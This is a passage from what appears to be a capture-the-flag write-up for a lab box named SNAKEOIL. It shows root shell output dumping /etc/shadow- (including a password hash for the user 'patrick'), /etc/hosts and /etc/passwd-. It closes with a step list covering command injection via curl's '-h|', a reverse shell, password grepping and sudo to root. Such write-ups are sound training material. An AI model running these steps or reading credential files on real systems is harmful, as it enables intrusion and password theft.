uucp:*:18789:0:99999:7:::
proxy:*:18789:0:99999:7:::
www-data:*:18789:0:99999:7:::
backup:*:18789:0:99999:7:::
list:*:18789:0:99999:7:::
irc:*:18789:0:99999:7:::
gnats:*:18789:0:99999:7:::
nobody:*:18789:0:99999:7:::
_apt:*:18789:0:99999:7:::
systemd-timesync:*:18789:0:99999:7:::
systemd-network:*:18789:0:99999:7:::
systemd-resolve:*:18789:0:99999:7:::
messagebus:*:18789:0:99999:7:::
tss:*:18789:0:99999:7:::
dnsmasq:*:18789:0:99999:7:::
usbmux:*:18789:0:99999:7:::
rtkit:*:18789:0:99999:7:::
sshd:*:18789:0:99999:7:::
pulse:*:18789:0:99999:7:::
speech-dispatcher:!:18789:0:99999:7:::
avahi:*:18789:0:99999:7:::
saned:*:18789:0:99999:7:::
colord:*:18789:0:99999:7:::
geoclue:*:18789:0:99999:7:::
hplip:*:18789:0:99999:7:::
Debian-gdm:*:18789:0:99999:7:::
patrick:$6$sXWgjV4KdmDvnYAL$piDmGfhJpvr7psgyd66LdQRugoCaDcuqXmBoqNMgoSp33w1tk7/ra4DON64KYZwbOKA5yjN0KtHx6emdJ1qJc1:18789:0:99999:7:::
systemd-coredump:!!:18789::::::</code></pre>
<h3 id="etchosts">/etc/hosts</h3>
<pre class="shell"><code>root@SNAKEOIL:~# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       SNAKEOIL.snakeoil.goodtech.inc  SNAKEOIL

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters</code></pre>
<h3 id="etc-hyphenated-passwd-and-shadow">/etc hyphenated passwd and shadow</h3>
<pre class="shell"><code>root@SNAKEOIL:~# ls -la /etc/*-
ls -la /etc/*-
-rw-r--r-- 1 root root    957 Jun 12  2021 /etc/group-
-rw-r----- 1 root shadow  807 Jun 12  2021 /etc/gshadow-
-rw-r--r-- 1 root root   2132 Jun 12  2021 /etc/passwd-
-rw-r----- 1 root shadow 1150 Jun 12  2021 /etc/shadow-
-rw-r--r-- 1 root root      0 Jun 12  2021 /etc/subgid-
-rw-r--r-- 1 root root      0 Jun 12  2021 /etc/subuid-
root@SNAKEOIL:~# cat /etc/shadow-
cat /etc/shadow-
root:!:18789:0:99999:7:::
daemon:*:18789:0:99999:7:::
bin:*:18789:0:99999:7:::
sys:*:18789:0:99999:7:::
sync:*:18789:0:99999:7:::
games:*:18789:0:99999:7:::
man:*:18789:0:99999:7:::
lp:*:18789:0:99999:7:::
mail:*:18789:0:99999:7:::
news:*:18789:0:99999:7:::
uucp:*:18789:0:99999:7:::
proxy:*:18789:0:99999:7:::
www-data:*:18789:0:99999:7:::
backup:*:18789:0:99999:7:::
list:*:18789:0:99999:7:::
irc:*:18789:0:99999:7:::
gnats:*:18789:0:99999:7:::
nobody:*:18789:0:99999:7:::
_apt:*:18789:0:99999:7:::
systemd-timesync:*:18789:0:99999:7:::
systemd-network:*:18789:0:99999:7:::
systemd-resolve:*:18789:0:99999:7:::
messagebus:*:18789:0:99999:7:::
tss:*:18789:0:99999:7:::
dnsmasq:*:18789:0:99999:7:::
usbmux:*:18789:0:99999:7:::
rtkit:*:18789:0:99999:7:::
sshd:*:18789:0:99999:7:::
pulse:*:18789:0:99999:7:::
speech-dispatcher:!:18789:0:99999:7:::
avahi:*:18789:0:99999:7:::
saned:*:18789:0:99999:7:::
colord:*:18789:0:99999:7:::
geoclue:*:18789:0:99999:7:::
hplip:*:18789:0:99999:7:::
Debian-gdm:*:18789:0:99999:7:::
patrick:$6$sXWgjV4KdmDvnYAL$piDmGfhJpvr7psgyd66LdQRugoCaDcuqXmBoqNMgoSp33w1tk7/ra4DON64KYZwbOKA5yjN0KtHx6emdJ1qJc1:18789:0:99999:7:::
root@SNAKEOIL:~# cat /etc/passwd- 
cat /etc/passwd-
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pulse:x:110:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:112:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:116:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
</code></pre>
<figure>
<img src="35-both-of-the-flags.png" alt="" /><figcaption>35-both-of-the-flags</figcaption>
</figure>
<p>Rooted.</p>
<h2 id="how-to-hack">How to hack</h2>
<ol type="1">
<li>Find running web app.</li>
<li>Figure out that /login and /registration work</li>
<li>Register, Login, obtain token.</li>
<li>Figure out that /secret is required for /run</li>
<li>Figure out that /run is running curl</li>
<li>Figure out that <code>-h|</code> allows you to execute commands; bash is banned.</li>
<li>Catch a reverse shell</li>
<li>Grep for password. It stops right there where you need to see.</li>
<li><code>sudo su</code>, oh, do get an interactive TTY, whatever that means.</li>
<li>bug out soldier, you have been through a lot.</li>
</ol>
